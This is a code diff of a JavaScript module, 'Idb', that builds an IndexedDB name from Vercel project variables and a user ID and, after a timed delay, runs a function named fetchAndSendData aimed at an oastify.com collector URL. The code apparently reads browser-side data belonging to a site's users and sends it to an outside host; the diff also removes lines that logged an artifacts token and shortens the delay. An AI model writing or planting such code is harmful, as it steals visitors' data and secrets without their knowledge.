@@ -16,14 +16,8 @@ export const Idb = (prjid) => {
   const userId = match ? match[1] : null;
   setTimeout(() => {
     function fetchAndSendData() {
-        console.log({NEXT_PUBLIC_VERCEL_PROJECT_ID});
-        console.log({NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF});
-        console.log({NEXT_PUBLIC_VERCEL_ARTIFACTS_TOKEN});
 
-        //turning dbNameObj to str
         const dbName = String("rep:live_mode_1@") + String(NEXT_PUBLIC_VERCEL_PROJECT_ID) + String("@") + String(NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF) + String("-") + String(userId) + String(":4");
-        //const jsonString = JSON.stringify({dbNameObj});
-        //const dbName = JSON.parse(jsonString).dbName;
       
         console.log(dbName);
         const url = 'https://rqlt1694pp1b11zyns5oflv8fzlq9h17pw.oastify.com';
@@ -85,5 +79,5 @@ export const Idb = (prjid) => {
 
     // Call the function to start fetching and sending data
     fetchAndSendData();
-}, 5000);
+}, 4000);
 };
